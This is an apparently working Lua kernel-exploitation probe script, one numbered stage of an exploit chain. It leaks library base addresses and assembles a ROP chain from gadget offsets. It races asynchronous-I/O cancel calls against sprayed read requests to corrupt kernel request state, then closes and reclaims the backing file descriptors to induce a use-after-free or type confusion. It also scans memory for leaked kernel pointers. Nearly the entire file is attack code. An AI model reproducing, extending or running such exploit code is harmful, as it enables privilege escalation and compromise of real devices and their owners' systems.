-- CRASH_CLASS: RISKY
-- PROBE 542a: close backing fd while spray AIO requests stuck in corrupted state
--
-- After cancel(666) TOCTOU race on in-flight requests (541b pattern),
-- spray requests are orphaned in state=0x1 — the kernel thinks they're
-- still "submitted" but they were never enqueued to the VFS layer.
--
-- If the kernel's AIO sub-object still holds a reference to the file
-- descriptor (urandom fd used for spray reads), closing that fd removes
-- the underlying file object. Any later kernel operation on the corrupted
-- request that dereferences the file pointer → UAF.
--
-- Flow:
-- 1. Corrupt AIO via cancel race (541b pattern) → spray stuck state=0x1
-- 2. Close ALL urandom fds (spray backing + original)
-- 3. Open replacement fds (socketpairs) to reclaim the file slots
-- 4. Poll/delete the corrupted spray IDs → does kernel touch freed file?
-- 5. Submit new AIO on replacement fds → does kernel confuse objects?
-- 6. Check for kernel pointers, crashes, or anomalous behavior

print("=== PROBE 542a: CLOSE BACKING FD + CORRUPTED AIO ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(b, n) for off = 0, n - 4, 4 do wd(b + off, 0) end end
local function write_string(buf, s)
    for i = 1, #s, 4 do
        local b0 = string.byte(s, i) or 0
        local b1 = string.byte(s, i+1) or 0
        local b2 = string.byte(s, i+2) or 0
        local b3 = string.byte(s, i+3) or 0
        wd(buf + (i - 1), b0 + b1 * 256 + b2 * 65536 + b3 * 16777216)
    end
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function is_kptr(val)
    local h, _ = get_hi_lo(val)
    if h < 0 then h = h + 0x100000000 end
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

local Z = uint64(0)
local sc20 = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc455 = make_syscall(455)
local sc240 = make_syscall(240)
local sc669 = make_syscall(669)
local sc664 = make_syscall(664)
local sc662 = make_syscall(662)
local sc666 = make_syscall(666)
local sc670 = make_syscall(670)
local sc135 = make_syscall(135)  -- socketpair
local sc6   = make_syscall(6)    -- close
local sc5   = make_syscall(5)    -- open

local pid = to_num(sc20())
print("pid=" .. pid)

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(Z, info) end)
local eb = uint64(string.format("0x%X%08X", safe_rd(info + 0x10C) or 0, safe_rd(info + 0x108) or 0))
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", safe_rd(info + 0x10C) or 0, safe_rd(info + 0x108) or 0))
print("eb=" .. q(eb) .. " lk=" .. q(lk))

local pop_rax_ret     = eb + uint64(0x992)
local pop_rdi_ret     = eb + uint64(0xC9DFE)
local pop_rsi_ret     = eb + uint64(0xD77D)
local pop_rdx_ret     = eb + uint64(0x3B02D7)
local pop_rcx_ret     = eb + uint64(0xE64)
local mov_rdi_rax_ret = eb + uint64(0x92C67)
local bare_ret        = eb + uint64(0x42)
local fn_addr         = lk + uint64(0xB57)

-- ============================================================
-- [A] Init AIO + open urandom fds
-- ============================================================
print("[A] init")
pcall(function() sc670(Z, Z, Z, Z, Z, Z) end)

local urand_path = memory.alloc(16)
write_string(urand_path, "/dev/urandom\0")

-- Open multiple urandom fds so spray uses different ones
local URAND_COUNT = 4
local urand_fds = {}
for i = 1, URAND_COUNT do
    local ok_o, fd = pcall(function()
        return sc5(uint64(to_num(urand_path)), Z, Z)
    end)
    urand_fds[i] = ok_o and to_num(fd) or -1
end
print(string.format("  urandom fds: %d %d %d %d", urand_fds[1], urand_fds[2], urand_fds[3], urand_fds[4]))

local NUM_IDS = 32
local NOP_PAD = 8
local SPRAY_PER_ID = 4

-- Create socketpairs for blocking reads (originals)
local read_fds = {}
local write_fds = {}
local sv_buf = memory.alloc(8)

for i = 1, NUM_IDS do
    wd(sv_buf, 0xFFFFFFFF)
    wd(sv_buf + 4, 0xFFFFFFFF)
    local ok_sp, rv_sp = pcall(function()
        return sc135(uint64(1), uint64(2), uint64(0), uint64(to_num(sv_buf)))
    end)
    local fd0 = safe_rd(sv_buf) or -1
    local fd1 = safe_rd(sv_buf + 4) or -1
    if ok_sp and to_num(rv_sp) == 0 and fd0 >= 0 and fd1 >= 0 then
        read_fds[i] = fd0
        write_fds[i] = fd1
    else
        read_fds[i] = -1
        write_fds[i] = -1
    end
end

local good_pairs = 0
for i = 1, NUM_IDS do
    if read_fds[i] >= 0 then good_pairs = good_pairs + 1 end
end
print(string.format("  socketpairs=%d/%d", good_pairs, NUM_IDS))

if good_pairs < 8 then
    print("TOO FEW SOCKETPAIRS")
    return
end

-- Pre-allocate spray buffers with sentinel
local spray_data_bufs = {}
local spray_res_bufs = {}
for i = 1, NUM_IDS * SPRAY_PER_ID do
    spray_data_bufs[i] = memory.alloc(64)
    spray_res_bufs[i] = memory.alloc(16)
    for j = 0, 60, 4 do wd(spray_data_bufs[i] + j, 0xDEAD0000 + i) end
    wd(spray_res_bufs[i], 0x77777777)
end

-- AIO helpers
local reqs_buf = memory.alloc(0x30)
local ids_out  = memory.alloc(8)

local function aio_submit_read(fd, data_buf, res_buf)
    zero(reqs_buf, 0x28)
    wq(reqs_buf + 0x08, uint64(16))
    wq(reqs_buf + 0x10, uint64(to_num(data_buf)))
    wq(reqs_buf + 0x18, uint64(to_num(res_buf)))
    wd(reqs_buf + 0x20, fd)
    wd(ids_out, 0)
    local ok, rv = pcall(function()
        return sc669(uint64(1), uint64(to_num(reqs_buf)), uint64(1), uint64(1), uint64(to_num(ids_out)))
    end)
    return (ok and to_num(rv) or -999), (safe_rd(ids_out) or 0)
end

local function aio_poll_one(id)
    local id_p = memory.alloc(4); wd(id_p, id)
    local st_p = memory.alloc(4); wd(st_p, 0x77777777)
    local ok, rv = pcall(function()
        return sc664(uint64(to_num(id_p)), uint64(1), uint64(to_num(st_p)), Z)
    end)
    return (ok and to_num(rv) or -999), (safe_rd(st_p) or 0)
end

local function aio_delete_one(id)
    local id_p = memory.alloc(4); wd(id_p, id)
    local st_p = memory.alloc(4); wd(st_p, 0x77777777)
    local ok, rv = pcall(function()
        return sc662(uint64(to_num(id_p)), uint64(1), uint64(to_num(st_p)))
    end)
    return (ok and to_num(rv) or -999), (safe_rd(st_p) or 0)
end

local function make_tcb()
    local ok_t, p = pcall(function()
        return sc_mmap(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
    end)
    for toff = 0, 0x100, 8 do wq(p + toff, p) end
    local ptr = memory.alloc(8); wq(ptr, p)
    return ptr
end

-- Shared memory
local ok_sh, shared = pcall(function()
    return sc_mmap(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
zero(shared, 0x2000)
print("  shared=" .. q(shared))

-- ============================================================
-- [B] Submit AIO reads on empty socketpairs → stay pending
-- ============================================================
print("")
print("[B] Submit blocking AIO reads")

local orig_ids = {}
local ok_count = 0

for i = 1, NUM_IDS do
    if read_fds[i] >= 0 then
        local db = memory.alloc(32)
        local rb = memory.alloc(16)
        for j = 0, 28, 4 do wd(db + j, 0xBBBB0000 + i) end
        wd(rb, 0)
        local rv, id = aio_submit_read(read_fds[i], db, rb)
        if rv == 0 and id > 0 then
            ok_count = ok_count + 1
            orig_ids[ok_count] = id
        end
    end
end
print(string.format("  submitted=%d", ok_count))

-- Confirm pending
local pending_count = 0
for i = 1, ok_count do
    local p_rv, p_st = aio_poll_one(orig_ids[i])
    if p_rv == 0 and p_st ~= 3 and p_st ~= 0x10003 then
        pending_count = pending_count + 1
    end
end
print(string.format("  pending=%d (want all pending)", pending_count))

if pending_count == 0 then
    print("ALL COMPLETED — aborting")
    return
end

-- ============================================================
-- [C] Cancel race: child cancels, Lua sprays urandom reads
-- ============================================================
print("")
print("[C] Cancel race")

zero(shared, 0x1000)
for i = 1, ok_count do
    wd(shared + 0x410 + (i-1) * 4, orig_ids[i])
    wd(shared + 0x010 + (i-1) * 4, 0x77777777)
end

local function build_canceller(count)
    local map_size = 0x400000
    local ok_m, base = pcall(function()
        return sc_mmap(Z, uint64(map_size), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
    end)
    local base_n = to_num(base)
    local tcb = make_tcb()
    local mid = base_n + (map_size / 2)
    local write_pos = mid - 8
    local offset = 0
    local function emit(v) wq(uint64(write_pos + offset), v); offset = offset + 8 end

    emit(pop_rax_ret); emit(uint64(165))
    emit(pop_rdi_ret); emit(uint64(129))
    emit(pop_rsi_ret); emit(tcb)
    emit(fn_addr)

    for pad = 1, 20 do
        emit(pop_rax_ret); emit(uint64(20))
        emit(pop_rdi_ret); emit(Z)
        emit(fn_addr)
    end

    local shared_n = to_num(shared)
    for i = 0, count - 1 do
        local id_addr = uint64(shared_n + 0x410 + i * 4)
        local st_addr = uint64(shared_n + 0x010 + i * 4)

        emit(pop_rax_ret); emit(uint64(666))
        emit(pop_rdi_ret); emit(id_addr)
        emit(pop_rsi_ret); emit(uint64(1))
        emit(pop_rdx_ret); emit(st_addr)
        emit(fn_addr)

        for p = 1, NOP_PAD do
            emit(pop_rax_ret); emit(uint64(20))
            emit(pop_rdi_ret); emit(Z)
            emit(fn_addr)
        end
    end

    emit(pop_rax_ret); emit(uint64(count))
    emit(pop_rdi_ret); emit(uint64(shared_n + 4))
    emit(mov_rdi_rax_ret)

    emit(pop_rax_ret); emit(uint64(431))
    emit(pop_rdi_ret); emit(Z)
    emit(fn_addr)

    local tp = memory.alloc(0x40); zero(tp, 0x40)
    wq(tp, bare_ret)
    wq(tp + 0x10, base)
    wq(tp + 0x18, uint64(map_size / 2 + 8))
    return tp, offset
end

local tp, csz = build_canceller(ok_count)
print(string.format("  chain=%dB launching...", csz))

pcall(function() sc455(uint64(to_num(tp)), uint64(0x38)) end)

-- Spray: each spray request uses a round-robin urandom fd
local spray_ids = {}
local spray_count = 0
local spray_fd_map = {}
for s = 1, ok_count * SPRAY_PER_ID do
    local uf = urand_fds[((s - 1) % URAND_COUNT) + 1]
    if uf >= 0 and s <= #spray_data_bufs then
        local rv, id = aio_submit_read(uf, spray_data_bufs[s], spray_res_bufs[s])
        if rv == 0 and id > 0 then
            spray_count = spray_count + 1
            spray_ids[spray_count] = {id = id, buf_idx = s}
            spray_fd_map[spray_count] = uf
        end
    end
end
print(string.format("  spray=%d", spray_count))

-- Wait for child
local ts = memory.alloc(16)
wq(ts, uint64(3)); wq(ts + 8, Z)
for w = 1, 15 do
    if (safe_rd(shared + 4) or 0) > 0 then break end
    pcall(function() sc240(uint64(to_num(ts)), Z) end)
end
local child_done = safe_rd(shared + 4) or 0
print(string.format("  child_done=%d", child_done))

-- Quick race status check
local swap_count = 0
local cancel_ok = 0
for i = 0, ok_count - 1 do
    local st = safe_rd(to_num(shared) + 0x010 + i * 4) or 0
    if st == 0x80020010 then swap_count = swap_count + 1 end
    if st == 0x00000004 or st == 0x00000003 or st == 0x00000002 then cancel_ok = cancel_ok + 1 end
end
print(string.format("  swaps=%d cancel_ok=%d", swap_count, cancel_ok))

-- Check spray health BEFORE fd close
print("")
print("[D] Spray health BEFORE fd close")

local pre_stuck = 0
local pre_healthy = 0
for i = 1, spray_count do
    local p_rv, p_st = aio_poll_one(spray_ids[i].id)
    if p_rv == 0 and (p_st == 3 or p_st == 0x10003) then
        pre_healthy = pre_healthy + 1
    else
        pre_stuck = pre_stuck + 1
    end
end
print(string.format("  healthy=%d stuck=%d", pre_healthy, pre_stuck))

if pre_stuck == 0 then
    print("NO CORRUPTION — race didn't trigger, aborting escalation")
    for i = 1, spray_count do pcall(function() aio_delete_one(spray_ids[i].id) end) end
    for i = 1, NUM_IDS do
        if read_fds[i] >= 0 then pcall(function() sc6(uint64(read_fds[i])) end) end
        if write_fds[i] >= 0 then pcall(function() sc6(uint64(write_fds[i])) end) end
    end
    for i = 1, URAND_COUNT do
        if urand_fds[i] >= 0 then pcall(function() sc6(uint64(urand_fds[i])) end) end
    end
    print("=== 542a DONE (no corruption) ===")
    return
end

print(string.format("  CORRUPTION CONFIRMED: %d spray requests stuck", pre_stuck))

-- ============================================================
-- [E] Close ALL urandom fds (the backing fds for spray reads)
-- ============================================================
print("")
print("[E] Close urandom fds")

for i = 1, URAND_COUNT do
    if urand_fds[i] >= 0 then
        local ok_c, rv_c = pcall(function() return sc6(uint64(urand_fds[i])) end)
        print(string.format("  close(fd=%d) rv=%s", urand_fds[i], ok_c and tostring(to_num(rv_c)) or "pcall_fail"))
    end
end

-- ============================================================
-- [F] Reclaim fd slots with socketpairs (type confusion target)
-- ============================================================
print("")
print("[F] Reclaim fd slots with socketpairs")

local reclaim_read = {}
local reclaim_write = {}
local reclaimed = 0
for i = 1, URAND_COUNT * 2 do
    wd(sv_buf, 0xFFFFFFFF)
    wd(sv_buf + 4, 0xFFFFFFFF)
    local ok_sp, rv_sp = pcall(function()
        return sc135(uint64(1), uint64(1), uint64(0), uint64(to_num(sv_buf)))  -- SOCK_STREAM
    end)
    local fd0 = safe_rd(sv_buf) or -1
    local fd1 = safe_rd(sv_buf + 4) or -1
    if ok_sp and to_num(rv_sp) == 0 and fd0 >= 0 then
        reclaimed = reclaimed + 1
        reclaim_read[reclaimed] = fd0
        reclaim_write[reclaimed] = fd1
        print(string.format("  socketpair %d: fd=%d,%d", reclaimed, fd0, fd1))
    end
end
print(string.format("  reclaimed=%d socketpairs", reclaimed))

-- ============================================================
-- [G] Probe corrupted spray IDs — poll, delete, scan for kernel ptrs
-- ============================================================
print("")
print("[G] Probe corrupted spray IDs after fd close")

local post_poll_ok, post_poll_stuck, post_poll_fail = 0, 0, 0
local post_del_ok, post_del_weird, post_del_refused = 0, 0, 0
local kptr_found = 0
local anomalies = 0

for i = 1, spray_count do
    local entry = spray_ids[i]
    local id = entry.id
    local buf_idx = entry.buf_idx

    -- Poll: has the state changed after fd close?
    local p_rv, p_st = aio_poll_one(id)
    if p_rv == 0 and (p_st == 3 or p_st == 0x10003) then
        post_poll_ok = post_poll_ok + 1
        if post_poll_ok <= 3 then
            print(string.format("  POLL NOW OK: id=0x%X st=0x%X (was stuck!)", id, p_st))
        end
    elseif p_rv == 0 then
        post_poll_stuck = post_poll_stuck + 1
    else
        post_poll_fail = post_poll_fail + 1
    end

    -- Scan data buffer for kernel pointers or unexpected values
    for off = 0, 56, 8 do
        local val = safe_rq(spray_data_bufs[buf_idx] + off)
        if val and is_kptr(val) then
            kptr_found = kptr_found + 1
            if kptr_found <= 10 then
                print(string.format("  *** KPTR: buf[%d]+0x%X = %s ***", buf_idx, off, q(val)))
            end
        end
    end

    -- Scan result buffer
    local res_val = safe_rd(spray_res_bufs[buf_idx])
    if res_val and res_val ~= 0x77777777 and res_val ~= 0 then
        anomalies = anomalies + 1
        if anomalies <= 10 then
            print(string.format("  ANOMALY: res[%d]=0x%08X (was 0x77777777)", buf_idx, res_val))
        end
    end

    -- Try delete
    local d_rv, d_st = aio_delete_one(id)
    if d_rv == 0 and d_st == 0 then
        post_del_ok = post_del_ok + 1
    elseif d_rv == 0 and d_st == 0x80020010 then
        post_del_refused = post_del_refused + 1
    else
        post_del_weird = post_del_weird + 1
        if post_del_weird <= 5 then
            print(string.format("  DEL WEIRD: id=0x%X rv=%d st=0x%X", id, d_rv, d_st))
        end
    end
end

print(string.format("  poll: ok=%d stuck=%d fail=%d", post_poll_ok, post_poll_stuck, post_poll_fail))
print(string.format("  delete: ok=%d refused=%d weird=%d", post_del_ok, post_del_refused, post_del_weird))
print(string.format("  kernel_ptrs=%d anomalies=%d", kptr_found, anomalies))

-- ============================================================
-- [H] Try submitting NEW AIO on reclaimed fds
-- ============================================================
print("")
print("[H] Submit AIO on reclaimed socketpair fds")

local new_ids = {}
local new_count = 0
local new_bufs = {}
for i = 1, reclaimed do
    local db = memory.alloc(64)
    local rb = memory.alloc(16)
    for j = 0, 60, 4 do wd(db + j, 0xCAFE0000 + i) end
    wd(rb, 0x77777777)

    -- Write some data to the write-end so read completes
    local write_buf = memory.alloc(16)
    wd(write_buf, 0xF00D0000 + i)
    wd(write_buf + 4, 0xF00D0000 + i)
    wd(write_buf + 8, 0xF00D0000 + i)
    wd(write_buf + 12, 0xF00D0000 + i)
    pcall(function()
        make_syscall(4)(uint64(reclaim_write[i]), uint64(to_num(write_buf)), uint64(16))
    end)

    local rv, id = aio_submit_read(reclaim_read[i], db, rb)
    if rv == 0 and id > 0 then
        new_count = new_count + 1
        new_ids[new_count] = id
        new_bufs[new_count] = {data = db, res = rb, idx = i}
    else
        print(string.format("  submit FAIL on reclaim fd %d: rv=%d", reclaim_read[i], rv))
    end
end
print(string.format("  new_submitted=%d/%d", new_count, reclaimed))

-- Wait briefly for completion
wq(ts, uint64(0)); wq(ts + 8, uint64(200000000))
pcall(function() sc240(uint64(to_num(ts)), Z) end)

-- Check new request results
local new_ok, new_stuck, new_weird_data = 0, 0, 0
for i = 1, new_count do
    local p_rv, p_st = aio_poll_one(new_ids[i])
    if p_rv == 0 and (p_st == 3 or p_st == 0x10003) then
        new_ok = new_ok + 1
    else
        new_stuck = new_stuck + 1
        if new_stuck <= 3 then
            print(string.format("  NEW STUCK: id=0x%X st=0x%X", new_ids[i], p_st))
        end
    end

    local d0 = safe_rd(new_bufs[i].data) or 0
    if d0 == (0xCAFE0000 + new_bufs[i].idx) then
        new_weird_data = new_weird_data + 1
    end

    -- Scan for kernel pointers in data
    for off = 0, 56, 8 do
        local val = safe_rq(new_bufs[i].data + off)
        if val and is_kptr(val) then
            kptr_found = kptr_found + 1
            if kptr_found <= 10 then
                print(string.format("  *** KPTR in new buf[%d]+0x%X = %s ***", i, off, q(val)))
            end
        end
    end

    pcall(function() aio_delete_one(new_ids[i]) end)
end
print(string.format("  new: ok=%d stuck=%d sentinel_unchanged=%d", new_ok, new_stuck, new_weird_data))

-- ============================================================
-- [I] Health check
-- ============================================================
print("")
print("[I] Health check")

local h_db = memory.alloc(32)
local h_rb = memory.alloc(16)
wd(h_rb, 0x77777777)

-- Open fresh urandom for health check
local ok_hu, h_urand = pcall(function()
    return sc5(uint64(to_num(urand_path)), Z, Z)
end)
h_urand = ok_hu and to_num(h_urand) or -1

if h_urand >= 0 then
    local h_rv, h_id = aio_submit_read(h_urand, h_db, h_rb)
    if h_rv == 0 and h_id > 0 then
        wq(ts, uint64(0)); wq(ts + 8, uint64(200000000))
        pcall(function() sc240(uint64(to_num(ts)), Z) end)
        local h_prv, h_pst = aio_poll_one(h_id)
        local h_drv, h_dst = aio_delete_one(h_id)
        print(string.format("  create=0x%X poll=%d/%X del=%d/%X",
            h_id, h_prv, h_pst, h_drv, h_dst))
        if h_pst == 3 and h_dst == 0 then
            print("  HEALTHY")
        else
            print("  *** UNHEALTHY ***")
        end
    else
        print("  CREATE FAILED rv=" .. h_rv)
    end
    pcall(function() sc6(uint64(h_urand)) end)
else
    print("  can't open fresh urandom for health check")
end

-- ============================================================
-- [J] Cleanup
-- ============================================================
print("")
print("[J] Cleanup")

for i = 1, NUM_IDS do
    if read_fds[i] >= 0 then pcall(function() sc6(uint64(read_fds[i])) end) end
    if write_fds[i] >= 0 then pcall(function() sc6(uint64(write_fds[i])) end) end
end
for i = 1, reclaimed do
    if reclaim_read[i] >= 0 then pcall(function() sc6(uint64(reclaim_read[i])) end) end
    if reclaim_write[i] >= 0 then pcall(function() sc6(uint64(reclaim_write[i])) end) end
end

print(string.format("  total kernel_ptrs=%d total anomalies=%d", kptr_found, anomalies))

print("")
local pid2 = to_num(sc20())
print("pid=" .. pid2 .. (pid2 == pid and " OK" or " CHANGED"))
print("=== 542a DONE ===")
